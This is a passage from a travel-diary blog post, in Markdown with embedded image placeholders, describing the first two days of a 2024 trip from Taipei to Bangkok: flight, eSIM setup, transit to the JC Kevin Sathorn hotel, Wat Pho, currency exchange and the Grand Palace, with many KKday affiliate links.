venue!You can even book a boat party in Hong Kong now.For friends traveling to Hong Kong who want to try different venue experiences, you can check it out immediately: Common Room Booking Platform.8/02 Day 1 DepartureDeparting from home around 12:30 PM Be sure to take the direct train to the airport; the regular train, even if it’s early, won’t get you there faster than the direct train!Arrived at Taoyuan Airport Terminal 1 around 13:30There was no one at the check-in counter, so I checked in and completed the baggage drop-off immediately.Again, it was B1R, the farthest corner, requiring a shuttle bus to the boarding gate.With plenty of time before the 4 PM flight, I went to eat at Tasty, and this time I discovered I could order the chicken sandwich separately; previously, they only sold fried chicken!I also realized that if you walk straight from Tasty, you can reach Terminal 2, so if you have time, you can go to Terminal 2 for food; or you can go from Terminal 2 to Terminal 1 for the free VIP lounge XD.After buying Tasty, I went to the free VIP lounge in Terminal 1 to rest and eat. This time I saw someone charging their devices; last time, all the outlets were taken, but it seems they have fixed it (?).Around 15:30, headed to B1R boarding areaI don’t know if it’s because it’s a low-cost airline, but the information wasn’t updated (it kept showing 16:00, but it had actually changed to 16:35).With the flight delayed, the actual departure time was 17:13. VietJet’s seats are about the same size as Tigerair’s, larger than Peach Aviation, but the seats are uncomfortable, the leather material is not breathable, and sitting for too long can be painful. VietJet seems to allow you to eat your own food; on the return trip, someone was eating mango sticky rice on board without any issues.#### 19:30 Arrival at Bangkok BKK Suvarnabhumi AirportI only learned from my colleagues that if you arrive at Bangkok Airport during peak hours, you can purchase the [**Thailand Airport BKK Departure Meet and Greet Fast Track Service**](https://www.kkday.com/zh-tw/product/160605?cid=19365){:target=\"_blank\"} for quick clearance XD. However, since we arrived at this time, there were almost only people from our flight, so the clearance was very fast.#### 20:00 Baggage claim and exiting the airport![](/assets/b7e7c0938985/1*QDvOtf4PsS-jSESOkb-0AA.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxNDAwIiBoZWlnaHQ9IjEwNTAiPjxyZWN0IHdpZHRoPSIxMDAlIiBoZWlnaHQ9IjEwMCUiIGZpbGw9ImdyZXkiLz48L3N2Zz4=\" }Perhaps due to the low-cost airline, there weren't many people checking in, and baggage claim was super quick.#### eSIM Network SetupAs soon as I exited the airport, I started figuring out how to set up and activate the eSIM, only to find out...&gt; **_⚠️ Activating eSIM requires an internet connection ⚠️_** &gt; **_⚠️ Activating eSIM requires an internet connection ⚠️_** &gt; **_⚠️ Activating eSIM requires an internet connection ⚠️_** It's a bit like buying a pair of scissors but needing another pair to cut it open; activating the eSIM requires an internet connection. Luckily, a friend traveling with me had already activated his eSIM in Taiwan, so I borrowed his internet to activate mine. \\(The airport also has Wi-Fi available, so there's no need to worry too much\\)![](/assets/b7e7c0938985/1*_xv7JB_yl7d47ljrUTpYdw.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI2MjgiIGhlaWdodD0iMTIwMCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }![](/assets/b7e7c0938985/1*6vg_zfmf6tr3SIBUj6gi4A.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI2MjgiIGhlaWdodD0iMTIwMCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }![](/assets/b7e7c0938985/1*7-7yMcMgwbpNzBq1YgknaQ.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI2MjgiIGhlaWdodD0iMTIwMCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }To find the eSIM activation, simply long-press the QR code and select \"Add eSIM.\"&gt; **_I don't know why, but if you save the QR code to photos or notes, you lose the quick add feature. Another method is to send the QR code to a travel companion or print it out for your phone to scan._** ![](/assets/b7e7c0938985/1*hZBZoEJCLuHxEgbOVMEXBw.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI1NTQiIGhlaWdodD0iMTIwMCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }![](/assets/b7e7c0938985/1*_MctPE8uZYOdX5vnYoJnvg.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI2MDIiIGhlaWdodD0iMTMwNiI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }![](/assets/b7e7c0938985/1*KMKLtNg2Aaeug_cn5fitNQ.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI2MDIiIGhlaWdodD0iMTMwNiI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }iPhone iOS eSIM manual setup path: Settings -&gt; Cellular -&gt; Add eSIM -&gt; Scan QR Code -&gt; Manually enter information -&gt; Use as... You can select \"Travel\" -&gt; Choose \"Travel\" for mobile data -&gt; Done!Once activated, it’s like having dual SIMs, but the original SIM card has no internet until a roaming plan is purchased. **In case of emergency, you can switch back to the original SIM card!**- [For AIS mobile number inquiries, dial *545#, for balance inquiries dial *121#, for data inquiries dial *121*3#](https://www.kkday.com/zh-tw/product/137037-ais-16-day-unlimited-data-esim-activate-before-may-3-2023-thailand?cid=19365){:target=\"_blank\"}#### 20:30 Finding food at the airport![](/assets/b7e7c0938985/1*mDPRItCdp28u5P6tTQelqQ.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3NjgiIGhlaWdodD0iMTAyNCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }![](/assets/b7e7c0938985/1*bgHNI9p20Jyf3t3IMDExMQ.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMjAwIiBoZWlnaHQ9IjkwMCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }Since it would take over an hour to get to the city and the hotel, and the low-cost airline doesn't provide meals, everyone was quite hungry, so we decided to grab dinner at the airport.We found a Thai restaurant to eat at; the spicy minced pork was deliciously hot, and the vegetable soup helped alleviate the spiciness.#### 21:00 Moving to the hotel&gt; _👉👉👉 You can refer to KKday's airport transfer service:_ &gt; _[\\- Thailand | Airport Private Transfer | Suvarnabhumi Airport (BKK) / Don Mueang Airport (DMK) — Bangkok/Pattaya/Hua Hin City Hotels](https://www.kkday.com/zh-tw/product/3431-bkk-or-dmk-bangkok-private-transfer?cid=19365){:target=\"_blank\"}_ &gt; _[\\- Bangkok Airport Transfer | Private Car from Bangkok City to Suvarnabhumi Airport (BKK)/Don Mueang Airport (DMK)](https://www.kkday.com/zh-tw/product/138989?cid=19365){:target=\"_blank\"}_ ![](/assets/b7e7c0938985/1*cagHOMc-TKS9fmhN18zVOQ.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMjAwIiBoZWlnaHQ9IjM5OSI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }After finishing dinner around 21:00, we started moving towards the city and the hotel.**Taking public transport requires three transfers on the subway and BTS:**1. Airport Rail Link `Suvarnabhumi` -&gt; `Phaya Thai`2. BTS Sukhumvit Line `Phaya Thai` -&gt; `Siam`3. BTS Silom Line `Siam` -&gt; `Chong Nonsi`![](/assets/b7e7c0938985/1*OvL8K9OxwjMCVJ-3hYy2bw.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3NjgiIGhlaWdodD0iMTAyNCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }![](/assets/b7e7c0938985/1*-eJ_rrYns2teWCITXTnhTA.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI5MTciIGhlaWdodD0iMTE1OSI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }![](/assets/b7e7c0938985/1*PeWlfQ6fd55mU1Ojk0isJQ.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI5MjgiIGhlaWdodD0iMTE1NSI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }- The Airport Rail Link only allows ticket purchases.- BTS tickets can be purchased at the ticket window for the Rabbit Card (BTS transportation card) to load value and swipe in and out.- Please note that **the Rabbit Card can only be used on BTS**, not on MRT or the Airport Rail Link.![](/assets/b7e7c0938985/1*EF3IK_FXS4n3igDOsJ0C4A.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI5MDAiIGhlaWdodD0iMTIwMCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }![](/assets/b7e7c0938985/1*jY4Jg6_vGhAM5CjPrVM-Iw.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxNDAwIiBoZWlnaHQ9IjE4NjciPjxyZWN0IHdpZHRoPSIxMDAlIiBoZWlnaHQ9IjEwMCUiIGZpbGw9ImdyZXkiLz48L3N2Zz4=\" }![](/assets/b7e7c0938985/1*Dom8OdbMSRAAXtFpykCTZQ.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI4MTkiIGhlaWdodD0iOTQwIj48cmVjdCB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiBmaWxsPSJncmV5Ii8+PC9zdmc+\" }- Arrived at `Chong Nonsi` (later I found out that the King Power MahaNakhon building is at this station!)#### Walking to [JC KEVIN SATHORN BANGKOK HOTEL](https://jckevin.com/){:target=\"_blank\"}![](/assets/b7e7c0938985/1*6VrvZBTlo2gjg_lY7oQG8w.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3NjgiIGhlaWdodD0iMTAyNCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }![](/assets/b7e7c0938985/1*cgv3HGHsAkH8WL_jA6qTsg.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3NjgiIGhlaWdodD0iMTAyNCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }When exiting BTS, don’t rush down the overpass; you can walk across the road from the overpass.&gt; **_I felt it was quite dark along the way (not many streetlights), and it was a bit far to walk (15 mins / 1 KM). If walking alone at night, it can be quite scary._** _Along the way, you will pass a 7–11 and a small night market, where I bought some snacks to take back to the hotel._ &gt; _Additionally, if taking a taxi, due to the two-way road and U-turn issues, the driver has to go a little past the hotel to the next gap to turn back, which is a bit troublesome._ #### 10:30 JC KEVIN SATHORN BANGKOK HOTELArrived at the hotel around 10:30.[](https://www.youtube.com/watch?v=wg24V_VS6oA){:target=\"_blank\"}The room is very spacious, like a whole apartment, with a master bedroom, a second bedroom, two bathrooms, a kitchen, a living room, and a balcony.#### Memories from 2018![](/assets/b7e7c0938985/1*E0aQK0xnj1XNpLGoOZFmsQ.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMDI0IiBoZWlnaHQ9Ijc2OCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }![Taken in 2018 / iPhone 6](/assets/b7e7c0938985/1*mtrNSKjLGX-TJAhUqg8-dA.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMDI0IiBoZWlnaHQ9Ijc2OCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }Taken in 2018 / iPhone 6I didn't expect it to be such a coincidence; during the group employee trip to Bangkok in 2018, everyone took a taxi to the rooftop bar at this hotel XD.Additionally, they also offer a Sky Bar dinner package:- [Bangkok Sathorn JC Kevin Hotel Zoom Sky Bar Dinner](https://www.kkday.com/zh-hk/product/105589-zoom-sky-bar-anantara-sathorn-bangkok-package?cid=19365){:target=\"_blank\"}#### 2024![2024 / iPhone 15 Pro](/assets/b7e7c0938985/1*kcN34XRcZxrDzA6Q6PaWmg.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMjAwIiBoZWlnaHQ9IjkwMCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }2024 / iPhone 15 ProSince I was staying here, after dropping off my luggage in the room, I went up to take a look.![](/assets/b7e7c0938985/1*kIvqX7BT5bIUtzANl0wYgw.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMjAwIiBoZWlnaHQ9IjkwMCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }![](/assets/b7e7c0938985/1*S-kT-eBLGeyGp6HAghpySw.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxNDAwIiBoZWlnaHQ9IjE4NjciPjxyZWN0IHdpZHRoPSIxMDAlIiBoZWlnaHQ9IjEwMCUiIGZpbGw9ImdyZXkiLz48L3N2Zz4=\" }![](/assets/b7e7c0938985/1*h8ksUQqToXHPTda_RnwkSg.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3NjgiIGhlaWdodD0iMTAyNCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }Since it was already past dinner time, I could only order some snacks and skewers.### 8/03 Day 2 Wat Pho, Grand Palace, Wat Phra Kaew, Wat Arun, ICONSIAM, Lhao Lhao, Rock Pub Live#### Hotel Breakfast![](/assets/b7e7c0938985/1*7m7nqO5Q1kdTTPQsdx9TWg.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3NjgiIGhlaWdodD0iMTAyNCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }![](/assets/b7e7c0938985/1*t1xva8yggECe94znx32pew.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3NjgiIGhlaWdodD0iMTAyNCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }After having breakfast at the hotel in the morning, I went out. I thought the breakfast was okay, but there weren't many options.#### 9:30 Departure![](/assets/b7e7c0938985/1*A2zezLiqIEOngnuebgxUjA.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3NjgiIGhlaWdodD0iMTAyNCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }![](/assets/b7e7c0938985/1*dZQvSlCNcBjgE4-mdnFZMQ.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3NjgiIGhlaWdodD0iMTAyNCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }Since there were many people, we directly took a Grab (THB 135) to Wat Pho.![Photo by [Florian Wehde](https://unsplash.com/@florianwehde?utm_content=creditCopyText&amp;utm_medium=referral&amp;utm_source=unsplash){:target=\"_blank\"}](/assets/b7e7c0938985/1*uugMTbYQ9AF_rRdCAJb7fQ.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxNDAwIiBoZWlnaHQ9IjEwODMiPjxyZWN0IHdpZHRoPSIxMDAlIiBoZWlnaHQ9IjEwMCUiIGZpbGw9ImdyZXkiLz48L3N2Zz4=\" }Photo by [Florian Wehde](https://unsplash.com/@florianwehde?utm_content=creditCopyText&amp;utm_medium=referral&amp;utm_source=unsplash){:target=\"_blank\"}On the way, we passed through [Chinatown](https://www.kkday.com/zh-hk/blog/101689/bangkokchinatown?cid=19365){:target=\"_blank\"}, but I forgot to take a photo; it had a very cyberpunk vibe!&gt; **👉👉👉 _You can also consider KKday's: [Bangkok Private Day Tour: Wat Pho, Wat Arun, Grand Palace, Wat Phra Kaew Thailand.](https://www.kkday.com/zh-tw/product/145178-bangkok-private-day-tour-wat-pho-wat-arun-grand-palace-thailand?cid=19365){:target=\"_blank\"}_** #### Wat PhoEntrance fee: THB 300/person.![](/assets/b7e7c0938985/1*US6guIBQI2sK1YeNo_E2EQ.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3NjgiIGhlaWdodD0iMTAyNCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }![](/assets/b7e7c0938985/1*Rj9oZbchyWIdKjVnaeQgJA.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3NjgiIGhlaWdodD0iMTAyNCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }![](/assets/b7e7c0938985/1*BwMmDhr-NicePGLykaEoiQ.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3NjgiIGhlaWdodD0iMTAyNCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }The colorful chedis in Wat Pho have an indescribable grandeur.![](/assets/b7e7c0938985/1*74sTwjcNKsbJ2CV42lU7Vw.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3NjgiIGhlaWdodD0iMTAyNCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }![](/assets/b7e7c0938985/1*1x304rol4vf6Ui_uBXXkow.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMDI0IiBoZWlnaHQ9Ijc2OCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }![](/assets/b7e7c0938985/1*sEirRjvb3AVT4RcAP5GkzA.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3NjgiIGhlaWdodD0iMTAyNCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }&gt; _Last time I went to Kyushu, I also visited [Nanzoin to see the Reclining Buddha](/posts/travel-diaries/en/travel-diary-2024-second-visit-to-kyushu-9-day-free-trip-via-busan-hakata-cruise-entry-cb65fd5ab770/), and this time I came to see the Reclining Buddha in Thailand._ &gt; _**⚠️ Be cautious of pickpockets in crowded places ⚠️**_ You need to take off your shoes to enter, and you can walk around the Reclining Buddha to pay your respects.#### SuperRich Currency Exchange![](/assets/b7e7c0938985/1*nVGjeCj9k_PDnYvNovoZQA.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMDc3IiBoZWlnaHQ9Ijc4OSI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }![](/assets/b7e7c0938985/1*GKVidaEFygfEMNjfKFNweA.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3NjgiIGhlaWdodD0iMTAyNCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }After leaving Wat Pho, I thought I should first solve the currency exchange issue. Only one friend had exchanged some Thai Baht in advance; the others thought they would exchange in Bangkok. So after exiting, we walked to the nearby [The Old Siam Shopping Plaza](https://maps.app.goo.gl/UPNxgoTmtswuhHVS8){:target=\"_blank\"} to exchange money at SuperRich.**⚠️ Please note: The Taiwanese dollars you want to exchange must not have stains, markings, etc., otherwise, they will be rejected for exchange. \\(I happened to have a thousand-dollar bill from an ATM in Taiwan that had a pencil mark on it and was rejected for exchange\\)**&gt; _NTD $5,000 exchanged for THB $5,200_ ![](/assets/b7e7c0938985/1*rRkjgPnqf96sVjAl4t4HBQ.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMjAwIiBoZWlnaHQ9IjgwMCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }![Khanom bueang Thai Pancake](/assets/b7e7c0938985/1*kf2ELPmE7JF_zCPV6pI_uw.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3NjgiIGhlaWdodD0iMTAyNCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }Khanom bueang Thai PancakeAfter exchanging money, I had some cash, so I replenished my energy at the food market on the first floor; I had a sweet Thai pancake (ขนมเบื้อง) filled with meringue that tasted very sweet, like cotton candy, and also had a banana pancake; finally, I bought an iced coffee to continue on my way.#### Grand Palace and Wat Phra KaewEntrance fee: THB 500/person.&gt; **_👉👉👉 KKday offers: [Grand Palace and Wat Phra Kaew Guided Tour (English, Thai, Chinese, Japanese)](https://www.kkday.com/zh-tw/product/131601-grand-palace-wat-phra-kaew-90-minutes-guided-walking-tour-bangkok?cid=19365){:target=\"_blank\"} for those who want to learn more about the history._** ![](/assets/b7e7c0938985/1*MxN4hRUfwckqlFCdBy147Q.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMDI0IiBoZWlnaHQ9Ijc2OCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }![](/assets/b7e7c0938985/1*wV1mY20E1gdNFp1AW3rtiQ.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3NjgiIGhlaWdodD0iMTAyNCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }![](/assets/b7e7c0938985/1*Pip1Emt18DbSoJwZlVgbnA.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3NjgiIGhlaWdodD0iMTAyNCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }Walking back to the Grand Palace (Wat Phra Kaew is inside the Grand Palace), there are many government buildings along the way.![](/assets/b7e7c0938985/1*ddyZ00m0hwbjbakiHCvFfQ.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3NjgiIGhlaWdodD0iMTAyNCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }![](/assets/b7e7c0938985/1*QI-duyW-IR_h7wlkAHjnHA.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3NjgiIGhlaWdodD0iMTAyNCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }There are dress codes for entering the Grand Palace, so be especially careful!&gt; _No shorts, sleeveless shirts, ripped jeans, cropped pants, short skirts, etc._ &gt; _**⚠️ Be cautious of pickpockets in crowded places ⚠️**_ ![](/assets/b7e7c0938985/1*hjkUk1kHals5sKv1Tnoq6w.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3NjgiIGhlaWdodD0iMTAyNCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }![Yaksha Gate Guardian](/assets/b7e7c0938985/1*jdIxZp0-HbKmaczbdLy_6A.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3NjgiIGhlaWdodD0iMTAyNCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }Yaksha Gate Guardian![](/assets/b7e7c0938985/1*3eY-aDI0sA5C-4etXV2UTQ.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxNDAwIiBoZWlnaHQ9IjE4NjciPjxyZWN0IHdpZHRoPSIxMDAlIiBoZWlnaHQ9IjEwMCUiIGZpbGw9ImdyZXkiLz48L3N2Zz4=\" }![Yaksha and Monkey](/assets/b7e7c0938985/1*Ox3Fpe6vK-NoMCgySt9Dsw.webp){: 